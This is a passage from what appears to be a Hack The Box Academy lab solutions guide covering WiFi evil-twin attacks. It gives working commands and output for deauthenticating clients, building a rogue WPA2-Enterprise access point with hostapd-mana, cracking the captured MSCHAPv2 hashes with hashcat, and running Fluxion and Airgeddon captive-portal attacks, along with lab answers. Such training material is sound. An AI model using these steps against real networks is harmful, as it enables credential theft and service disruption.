the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    193 wpa_supplicant
    204 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Once enabled, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the scan results.

Code: shell

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```

```
wifi@HTB-Corp:~$ sudo airodump-ng wlan0mon

 CH 11 ][ Elapsed: 4 mins ][ 2025-03-06 05:56 ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 54:8C:A0:E8:DF:B1  -28      184        5    0   1   54   WPA2 CCMP   MGT  HTB-Corp                                                                                                                              

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 54:8C:A0:E8:DF:B1  BA:69:91:12:6A:23  -29   54 - 9      0        4                                                                                                                                               
 (not associated)   EE:B1:E8:70:2B:47  -49    0 - 1      0        2                                                                                                                                               
 (not associated)   46:D3:3F:48:AD:8F  -49    0 - 1      0        2   
```

Examining the output of `airodumo-ng`, students will discover several client devices and an access point for the `HTB-Corp` network. Students will also note that `HTB-Corp` is using WPA2 Enterprise, indicated by the `AUTH` type `MGT`.

In order to attack WPA2 Enterprise, the rogue access point must have a certificate, ideally one with information similar to the legitimate access point. Therefore, students need to deauthenticate a client from the `HTB-Corp` network and capture the handshake. `Note: the MAC address of the client may be different than what is shown below.`

Code: shell

```shell
sudo aireplay-ng -0 20 -a 54:8C:A0:E8:DF:B1 -c <CLIENT_MAC> wlan0mon
```

```
wifi@HTB-Corp:~$ sudo aireplay-ng -0 20 -a 54:8C:A0:E8:DF:B1 -c  BA:69:91:12:6A:23 wlan0mon                                                                            
08:13:30  Waiting for beacon frame (BSSID: 54:8C:A0:E8:DF:B1) on channel 1
08:13:30  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:31  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:31  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:32  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
<>SNIP>
```

After sending the deauthentication packets, students need to check `airodump-ng` to verify that the handshake was captured. Then, students need to examine the capture file with `wireshark`.

Code: shell

```shell
sudo -E wireshark HTB-01.cap
```

```
wifi@HTB-Corp:~$ sudo -E wireshark HTB-01.cap 

 ** (wireshark:919) 08:28:17.119880 [GUI WARNING] -- QStandardPaths: runtime directory '/run/user/1001' is not owned by UID 0, but a directory permissions 0700 owned by UID 1001 GID 1001
```

Students need to examine the certificate information, applying the display filter: `(wlan.sa == 9c:9a:03:39:bd:7a) && (tls.handshake.certificate)`.

![[HTB Solutions/Others/z. images/84deb0b27e313a05d1fafd3bc7627f52_MD5.jpg]]

Now, students need to create an x509 (self-signed) certificate using the same information as the certificate being used by `HTB-Corp`.

For the first step of this process, students need to generate the Diffie-Hellman parameters.

Code: shell

```shell
openssl dhparam -out dh.pem 2048
```

```
wifi@HTB-Corp:~$ openssl dhparam -out dh.pem 2048

Generating DH parameters, 2048 bit long safe prime

................................................................................................................................................................................+.......+................................................................+......<SNIP>
```

Next, students need to generate a CA key and CA certificate. When prompted, students need to enter the same information as what was seen in `wireshark`.

Code: shell

```shell
openssl genrsa -out ca-key.pem 2048
openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem
US
California
San Francisco
Hack The Box
HTB
HTB
admin@htb.com
```

```
wifi@HTB-Corp:~$ openssl genrsa -out ca-key.pem 2048
wifi@HTB-Corp:~$ openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Fransisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:admin@htb.com
```

Subsequently, students need to generate the server key and server certificate. When prompted, students need to enter the same information as they did for `ca.pem`, while entering `challenge1234` as the challenge password.

Code: shell

```shell
openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem
US
California
San Francisco
Hack The Box
HTB
HTB
admin@htb.com
challenge1234

openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
```

```
wifi@HTB-Corp:~$ openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem

Ignoring -days without -x509; not generating a certificate
..+.........+.....+......+.........+.............+..+...+.+.....+++++++++++++++++++++++++++++++..+..+.......++++++<SNIP>..............+..+.......++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:California
Locality Name (eg, city) []:San Francisco
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Hack The Box
Organizational Unit Name (eg, section) []:HTB
Common Name (e.g. server FQDN or YOUR name) []:HTB
Email Address []:admin@htb.com

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:challenge1234
An optional company name []:

wifi@HTB-Corp:~$ openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem

Certificate request self-signature ok
subject=C=US, ST=California, L=San Francisco, O=Hack The Box, OU=HTB, CN=HTB, emailAddress=admin@htb.com
```

Students need to create the configuration for the rogue access point.

Code: shell

```shell
cat << EOF > hostapd.conf
# 802.11 Options
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

# MANA
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF
```

```
wifi@HTB-Corp:~$ cat << EOF > hostapd.conf
# 802.11 Options
interface=wlan1
ssid=HTB-Corp
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=hostapd.eap_user

# Certificates
ca_cert=ca.pem
server_cert=server.pem
private_key=server-key.pem
private_key_passwd=whatever
dh_file=dh.pem

# MANA
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF
```

Since the target is using WPA2 Enterprise, an additional `hostapd.eap_user` file must be configured as well.

Code: shell

```shell
cat << EOF > hostapd.eap_user
* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]
EOF
```

```
wifi@HTB-Corp:~$ cat << EOF > hostapd.eap_user
* PEAP,TTLS,TLS,MD5,GTC,FAST
"t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAP "challenge1234" [2]
EOF
```

Now, students are ready to launch the rogue access point via `hostapd-mana`.

Code: shell

```shell
sudo hostapd-mana hostapd.conf
```

```
wifi@HTB-Corp:~$ sudo hostapd-mana hostapd.conf

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 2a:17:8c:09:0f:f1 and ssid "HTB-Corp"
random: Only 16/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

In another terminal, students need to deauthenticate the client connected to the legitimate `HTB-Wireless` network.

Code: shell

```shell
sudo aireplay-ng -0 20 -a 54:8C:A0:E8:DF:B1 -c  BA:69:91:12:6A:23 wlan0mon       
```

```
wifi@HTB-Corp:~$ sudo aireplay-ng -0 20 -a 54:8C:A0:E8:DF:B1 -c  BA:69:91:12:6A:23 wlan0mon                                                                            
08:13:30  Waiting for beacon frame (BSSID: 54:8C:A0:E8:DF:B1) on channel 1
08:13:30  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:31  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:31  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
08:13:32  Sending 64 directed DeAuth (code 7). STMAC: [BA:69:91:12:6A:23] [ 0| 0 ACKs]
<>SNIP>
```

After several moments, students need to check the terminal where `hostapd-mana` was running.

```
<SNIP>
MANA - Directed probe request for SSID 'HTB-Corp' from ba:69:91:12:6a:23
MANA - Directed probe request for SSID 'HTB-Corp' from ba:69:91:12:6a:23
wlan1: STA ba:69:91:12:6a:23 IEEE 802.11: authenticated
wlan1: STA ba:69:91:12:6a:23 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED ba:69:91:12:6a:23
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: HTB\Sentinal.Jr
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: HTB\Sentinal.Jr
MANA EAP EAP-MSCHAPV2 ASLEAP user=Sentinal.Jr | asleap -C 0c:2b:ac:7e:e5:d9:a8:95 -R c1:ae:91:4c:5d:06:85:dc:cd:52:53:9f:d4:a6:0f:dd:ff:18:5d:01:41:d9:92:47
MANA EAP EAP-MSCHAPV2 JTR | Sentinal.Jr:$NETNTLM$0c2bac7ee5d9a895$c1ae914c5d0685dccd52539fd4a60fddff185d0141d99247:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | Sentinal.Jr::::c1ae914c5d0685dccd52539fd4a60fddff185d0141d99247:0c2bac7ee5d9a895
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 9b 1d a5 77 c3 87 ca 1d 99 d5 92 85 25 8b d7 1d
MANA - Directed probe request for SSID 'HTB-Corp' from ba:69:91:12:6a:23
MANA - Directed probe request for SSID 'HTB-Corp' from ba:69:91:12:6a:23
```

Students will see that the victim authenticated using EAP-MSCHAPv2, resulting in the exposure of a hashed password. Therefore, students need to use Hashcat to discover the password's plaintext. `If hashcat produces an error on the target VM, students may run the following command from the Pwnbox.`

Code: shell

```shell
hashcat -m 5500 Sentinal.Jr::::b673c185c28c2db0529dfa9999dbc89b554918a4986058b6:f486df304412f89f /usr/share/wordlists/rockyou.txt.gz
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-23iatysq9n]─[~]
└──╼ [★]$ hashcat -m 5500 Sentinal.Jr::::b673c185c28c2db0529dfa9999dbc89b554918a4986058b6:f486df304412f89f /usr/share/wordlists/rockyou.txt.gz 

hashcat (v6.2.6) starting

<SNIP>

Sentinal.Jr::::b673c185c28c2db0529dfa9999dbc89b554918a4986058b6:f486df304412f89f:{hidden}
```

Answer: `september`

# Using Fluxion

## Question 1

### "Perform the evil twin attack as demonstrated in this section. What is the password obtained for the HTB-Wireless network?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `root:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:root /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-23iatysq9n]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.149 /u:root /p:wifi /dynamic-resolution 

[03:38:11:995] [221688:221689] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:38:11:296] [221688:221689] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:38:11:296] [221688:221689] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Then, students need to open a terminal and run `Fluxion`.

Code: shell

```shell
bash /opt/fluxion/fluxion.sh -i
```

```
root@twins:~# bash /opt/fluxion/fluxion.sh -i
```

The `Fluxion` tool automates Evil-Twin attacks by way of user prompts. The first task is to capture a WPA2 handshake. When prompted, students need to enter the selections shown below.

Select `Option 2 - Handshake Snooper` as the wireless attack for the access point.

```
[*] Select a wireless attack for the access point

                      ESSID: "[N/A]" / [N/A]                                    
                    Channel:  [N/A]                                             
                      BSSID:  [N/A] ([N/A])                          

	[1] Captive Portal Creates an "evil twin" access point.
	[2] Handshake Snooper Acquires WPA/WPA2 encryption hashes.
	[3] Back 

[fluxion@twins]-[~] 2
```

Select `Option 1 - wlan0` as the wireless interface for target searching.

```
[*] Select a wireless interface for target searching.

[1] wlan0    [+]                                                                
[2] wlan1    [+]                                                                
[3] Repeat                                                                    
[4] Back                                                                    

[fluxion@twins]-[~] 1
```

Select `Option 1 - All channels (2.4 GHz)` as the channel to monitor.

```
[*] Select a channel to monitor

	[1] All channels (2.4GHz)
	[2] All channels (5GHz)
	[3] All channels (2.4GHz & 5Ghz)
	[4] Specific channel(s)
	[5] Back

[fluxion@twins]-[~] 1
```

This action will launch an `xterm` terminal which scans and discovers available networks. Once the scan has captured sufficient data, students need to press `Ctrl+C` to stop the scan.

At the next prompt, select the `Option 1 - HTB-Wireless` as the target network.

```
                                    WIFI LIST                                   

[ * ] ESSID                          QLTY PWR STA CH SECURITY              BSSID

[001] HTB-Wireless                   100% -28   1  1 WPA2      52:CD:8C:79:AD:87

[fluxion@twins]-[~] 1
```

Choose `Option 3 - Skip` when asked to select a wireless interface for target tracking/

```
[*] Select a wireless interface for target tracking.
[*] Choosing a dedicated interface may be required.
[*] If you're unsure, choose "Skip"!

[1] wlan0    [*]                                                                
[2] wlan1    [+]                                                                
[3] Skip                                                                    
[4] Repeat                                                                    
[5] Back                                                                    

[fluxion@twins]-[~] 3
```

Select `Option 2 - aireplay-ng deauthentication` for the handshake retrieval method.

```
                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

[*] Select a method of handshake retrieval

	[1] Monitor (passive)
	[2] aireplay-ng deauthentication (aggressive)
	[3] mdk4 deauthentication (aggressive)
	[4] Back

[fluxion@twins]-[~] 2
```

Select `Option 1 - wlan0` as the interface to handle both monitoring and jamming activities.

```
                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

[*] Select an interface for monitoring & jamming.

	[1] wlan0    [*]
	[2] wlan1    [+]
	[3] Repeat
	[4] Back

[fluxion@twins]-[~] 1
```

For hash verification, choose `Option 1:aircrack-ng verification`.

```
[*] Select a method of verification for the hash

	[1] aircrack-ng verification (unreliable)
	[2] cowpatty verification (recommended)
	[3] Back

[fluxion@twins]-[~] 1
```

Select `Option 1 - Every 30 seconds` to have the verifier check every thirty seconds.

Code: sesion

```
[*] How often should the verifier check for a handshake?

	[1] Every 30 seconds (recommended).
	[2] Every 60 seconds.
	[3] Every 90 seconds.
	[4] Back

[fluxion@twins]-[~] 1
```

Choose `Option 2 - Synchronously` for the verification occurance.

```
[*] How should verification occur?

	[1] Asynchronously (fast systems only).
	[2] Synchronously (recommended).
	[3] Back

[fluxion@twins]-[~] 2
```

After pressing enter, three terminals will appear. Students need to let the attack run until they see the message `Handshake Snooper attack completed`.

Now, students need to use an Evil-Twin/captive portal attack, and verify the victim's password against the hash found the handshake.

Begin by selecting `Option 1 - Select another attack`.

```
[*] Handshake Snooper attack in progress...

	[1] Select another attack
	[2] Exit

[fluxion@twins]-[~] 1
```

Select `Option 1 - Captive Portal` as the wireless attack.

```
[*] Select a wireless attack for the access point

                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

	[1] Captive Portal Creates an "evil twin" access point.
	[2] Handshake Snooper Acquires WPA/WPA2 encryption hashes.
	[3] Back 

[fluxion@twins]-[~] 1
```

Choose `Y` to continue targeting the access point used in the first attack.

```
[*] Fluxion is targetting the access point above.
[*] Continue with this target? [Y/n] Y
```

Select `Option 3 - Skip` for the target tracking.

```
[*] Select a wireless interface for target tracking.
[*] Choosing a dedicated interface may be required.
[*] If you're unsure, choose "Skip"!

[1] wlan0    [*]                                                                
[2] wlan1    [+]                                                                
[3] Skip                                                                    
[4] Repeat                                                                    
[5] Back                                                                    

[fluxion@twins]-[~] 3  
```

Select `Option 2 - wlan1` as the interface for jamming.

```
[*] Select an interface for jamming.

[1] wlan0    [*]                                                                
[2] wlan1    [+]                                                                
[3] Repeat                                                                    
[4] Back                                                                    

[fluxion@twins]-[~] 2
```

Select `Option 2: wlan0` as the interface for the access point.

```
[*] Select an interface for the access point.

[1] eth0     [-]                                                                
[2] wlan0    [*]                                                                
[3] wlan1    [*]                                                                
[4] Repeat                                                                    
[5] Back                                                                    

[fluxion@twins]-[~] 2
```

For the method of deauthentication, select `Option 2: aireplay`.

```
[*] Select a method of deauthentication

[1] mdk4
[2] aireplay
[3] mdk3

[fluxion@twins]-[~] 2
```

Choose `Option 1 - hostapd` as the access point service.

```
[*] Select an access point service

                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

	[1] Rogue AP - hostapd (recommended)
	[2] Rogue AP - airbase-ng (slow)
	[3] Back

[fluxion@twins]-[~] 1
```

Select `Option 1 - Cowpatty` as the password verification method.

```
[*] Select a password verification method

                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

	[1] hash - cowpatty
	[2] hash - aircrack-ng (default, unreliable)
	[3] Back

[fluxion@twins]-[~] 1
```

Pick `Option 1 - Use hash found` to use the hash from the handshake capture.

```
[*] A hash for the target AP was found.
[*] Do you want to use this file?

	[1] Use hash found
	[2] Specify path to hash
	[3] Rescan handshake directory
	[4] Back

[fluxion@twins]-[~] 1
```

Select `Option 1 - aircrack-ng verification` as the method of verification for the hash.

```
[*] Select a method of verification for the hash

                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

	[1] aircrack-ng verification (unreliable)
	[2] cowpatty verification (recommended)

[fluxion@twins]-[~] 1
```

Submit `Option 1 - Create an SSL certificate` as the certificate source of the captive portal.

```
[*] Select SSL certificate source for captive portal.

	[1] Create an SSL certificate
	[2] Detect SSL certificate (search again)
	[3] None (disable SSL)
	[4] Back

[fluxion@twins]-[~] 1
```

Select `Option 1 - disconnected` as the internet connectivity type for the rogue network.

```
[*] Select an internet connectivity type for the rogue network.

	[1] disconnected (recommended)
	[2] emulated
	[3] Back

[fluxion@twins]-[~] 1
```

Choose `Option 54 - NETGEAR` as the captive portal interface.

```
[*] Select a captive portal interface for the rogue network.

                      ESSID: "HTB-Wireless" / WPA2                              
                    Channel:  1                                                 
                      BSSID:  52:CD:8C:79:AD:87 ([N/A])                   

		  <SNIP>
          [48] HUAWEI                                               it          
          [49] HUAWEI                                              tur          
          [50] HUAWEI                                               zh          
          [51] kpn                                                  nl          
          [52] Livebox                                              fr          
          [53] movistar                                             es          
          [54] NETGEAR                                              en          

[fluxion@twins]-[~] 54
```

After pressing enter, six new tabs will open as the attack begins. When the victim connects to the rogue AP and submits their credentials, the tabs will close and students will see the following message.

![[HTB Solutions/Others/z. images/75c8581562d47814b1b8a7a1befed188_MD5.jpg]]

With the attack now complete, students need to examine the log file to obtain the password.

Code: shell

```shell
cat /opt/fluxion/attacks/Captive\ Portal/netlog/HTB-Wireless-52\:CD\:8C\:79\:AD\:87.log 
```

```
root@twins:~# cat /opt/fluxion/attacks/Captive\ Portal/netlog/HTB-Wireless-52\:CD\:8C\:79\:AD\:87.log 

FLUXION 6.12

SSID: "HTB-Wireless"
BSSID: 52:CD:8C:79:AD:87 ()
Channel: 1
Security: WPA2
Time: 00:00:13
Password: {hidden}
Mac: unknown ()
IP: unknown
```

Answer: `hrdpasswordhere`

# Using Airgeddon

## Question 1

### "Perform the evil twin attack as demonstrated in this section. What is the password obtained for the HTB-Wireless network?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `root:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:root /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-23iatysq9n]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.246 /u:root /p:wifi /dynamic-resolution 

[03:38:11:995] [221688:221689] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:38:11:296] [221688:221689] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:38:11:296] [221688:221689] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:38:11:332] [221688:221689] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Then, students need to open a terminal and run `airgeddon.sh`.

Code: shell

```shell
bash /opt/airgeddon/airgeddon.sh
```

```
root@twins:~#  bash /opt/airgeddon/airgeddon.sh
```

On the Welcome screen, students need to press `Enter` to continue.

```
*********************************** Welcome ************************************ 
This script is only for educational purposes. Be good boyz&girlz! 
Use it only on your own networks!! 

Accepted bash version (5.1.16(1)-release). Minimum required version: 4.2 

Root permissions successfully detected 

Detecting resolution... Detected!: 1024x768 

Known compatible distros with this script: 
"Arch" "Backbox" "BlackArch" "CentOS" "Cyborg" "Debian" "Fedora" "Gentoo" "Kali" "Kali arm" "Manjaro" "Mint" "OpenMandriva" "Parrot" "Parrot arm" "Pentoo" "Raspberry Pi OS" "Raspbian" "Red Hat" "SuSE" "Ubuntu" "Wifislax" 

Detecting system... 
Ubuntu Linux

Let's check if you have installed what script needs 
Press [Enter] key to continue...
```

After the check for essential and optional tools is performed, students need to press `Enter` again.

```
Your distro has the essential tools but it hasn't some optional. The script can continue but you can't use some features. It is recommended to install missing tools 
Press [Enter] key to continue...
```

Press `Enter` to continue after seeing the message regarding no internet.

```
It seems you have no internet access. The script can't connect to repository. It will continue without updating... 
Press [Enter] key to continue...
```

At the next prompt, select `Option 2 - wlan0` as the interface to work with.

```
***************************** Interface selection ****************************** 
Select an interface to work with: 
--------- 
1.  eth0@if10 // Chipset: Unknown 
2.  wlan0 // Chipset: Unknown 
3.  wlan1 // Chipset: Unknown 
--------- 
*Hint* If you have any doubt or problem, you can check Wiki FAQ section (https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ%20&%20Troubleshooting) or ask in our Discord channel: https://discord.gg/sQ9dgt9 
--------- 
> 2
```

Now at the main menu, choose `Option 2 - Put interface in monitor mode`, then press `Enter`.

```
************************* airgeddon v11.30 main menu ************************** 
Interface wlan0 selected. Mode: Managed. Supported bands: 2.4Ghz, 5Ghz 

Select an option from menu: 
--------- 
1.  Exit script 
2.  Select another network interface 
3.  Put interface in monitor mode 
4.  Put interface in managed mode 
--------- 
5.  DoS attacks menu 
6.  Handshake/PMKID tools menu 
7.  Offline WPA/WPA2 decrypt menu 
8.  Evil Twin attacks menu 
9.  WPS attacks menu 
10.  WEP attacks menu 
11. Enterprise attacks menu 
--------- 
12. About & Credits / Sponsorship mentions 
13. Options and language menu 
--------- 
*Hint* It is known that the software used in the 5Ghz band still presents some problems sometimes. For example airodump, that when scanning networks can show a value "-1" on channel depending on the card chipset and the driver. It is also known that Ralink chipsets sometimes are getting errors on high channels " 
--------- 
> 2
Setting your interface in monitor mode... 

The interface changed its name while setting in monitor mode. Autoselected 

Monitor mode now is set on wlan0mon 
Press [Enter] key to continue...
```

Next, select `Option 7 - Evil Twin attacks menu`.

```
************************ airgeddon v11.30 main menu ************************** 
Interface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz 

Select an option from menu: 
--------- 
1.  Exit script 
2.  Select another network interface 
3.  Put interface in monitor mode 
4.  Put interface in managed mode 
--------- 
5.  DoS attacks menu 
6.  Handshake/PMKID tools menu 
7.  Offline WPA/WPA2 decrypt menu 
8.  Evil Twin attacks menu 
9.  WPS attacks menu 
10.  WEP attacks menu 
11. Enterprise attacks menu 
--------- 
12. About & Credits / Sponsorship mentions 
13. Options and language menu 
--------- 
*Hint* It is known that the software used in the 5Ghz band still presents some problems sometimes. For example airodump, that when scanning networks can show a value "-1" on channel depending on the card chipset and the driver. It is also known that Ralink chipsets sometimes are getting errors on high channels " 
--------- 
> 7
```

Select `Option 9 - Evil Twin AP attack with captive portal`, then press `Enter` to continue.

```
**************************** Evil Twin attacks menu **************************** 
Interface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz 
Selected BSSID: None 
Selected channel: None 
Selected ESSID: None 

Select an option from menu: 
--------- 
1.  Return to main menu 
2.  Select another network interface 
3.  Put interface in monitor mode 
4.  Put interface in managed mode 
5.  Explore for targets (monitor mode needed) 
---------------- (without sniffing, just AP) ----------------- 
6.  Evil Twin attack just AP 
---------------------- (with sniffing) ----------------------- 
7.  Evil Twin AP attack with sniffing 
8.  Evil Twin AP attack with sniffing and bettercap-sslstrip2 
9.  Evil Twin AP attack with sniffing and bettercap-sslstrip2/BeEF 
------------- (without sniffing, captive portal) ------------- 
10.  Evil Twin AP attack with captive portal (monitor mode needed) 
--------- 
*Hint* If you want to integrate "DoS pursuit mode" on an Evil Twin attack, another additional wifi interface in monitor mode will be needed to be able to perform it 
--------- 
> 9
An exploration looking for targets is going to be done... 
Press [Enter] key to continue...
```

Press `Enter` to begin exploring for targets.

Code: sessiojn

```
**************************** Exploring for targets ***************************** 
Exploring for targets option chosen (monitor mode needed) 

Selected interface wlan0mon is in monitor mode. Exploration can be performed 

Chosen action can be carried out only over WPA/WPA2 networks, however WPA3 has been included in the scan filter because these networks sometimes work in "Mixed mode" offering WPA2/WPA3 and in that case they are displayed in the scan window as WPA3. So WPA3 networks will appear but then airgeddon will analyze them after scan to allow you select only those that also offering WPA2 

WPA/WPA2/WPA3 filter enabled in scan. When started, press [Ctrl+C] to stop... 
Press [Enter] key to continue...
```

When the `HTB-Wireless` target is discovered, press `Enter`. Then, from the Select Target menu, choose `Option 2 - HTB-Wireless`.

```
******************************** Select target ********************************* 

  N.         BSSID      CHANNEL  PWR   ENC    ESSID 
------------------------------------------------------- 
  1)   03:00:03:D2:02:F0   -1     0%          (Hidden Network)
  2)   52:CD:8C:79:AD:87    1    72%   WPA2   HTB-Wireless

(*) Network with clients 
------------------------------------------------------- 
Select target network: 
> 2
```

For the deauthentication method, select `Option 2 - Aireplay-ng`. Choose `N` to continue without enabling DoS pursuit mode.

```
******************************* Evil Twin deauth ******************************* 
Interface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz 
Selected BSSID: 52:CD:8C:79:AD:87 
Selected channel: 1 
Selected ESSID: HTB-Wireless 
Handshake file selected: None 

Select an option from menu: 
--------- 
1.  Return to Evil Twin attacks menu 
--------- 
2.  Deauth / disassoc amok mdk4 attack 
3.  Deauth aireplay attack 
4.  WIDS / WIPS / WDS Confusion attack 
--------- 
*Hint* If you have any doubt or problem, you can check Wiki FAQ section (https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/FAQ%20&%20Troubleshooting) or ask in our Discord channel: https://discord.gg/sQ9dgt9 
--------- 
> 2
If you want to integrate "DoS pursuit mode" on an Evil Twin attack, another additional wifi interface in monitor mode will be needed to be able to perform it 

Do you want to enable "DoS pursuit mode"? This will re-launch the attack if target AP change its channel countering "channel hopping" [y/N] 
> N
```

Type `N` and press `Enter` to proceed without modifying the MAC address. Then, select `N` to allow `airgeddon` to automatically capture the handshake. For the timeout value, choose `10` seconds, then press `Enter` to continue.

```
******************* Evil Twin AP attack with captive portal ******************** 
Interface wlan0mon selected. Mode: Monitor. Supported bands: 2.4Ghz, 5Ghz 
Selected BSSID: 52:CD:8C:79:AD:87 
Selected channel: 1 
Selected ESSID: HTB-Wireless 
Deauthentication chosen method: Aireplay 
Handshake file selected: None 
--------- 
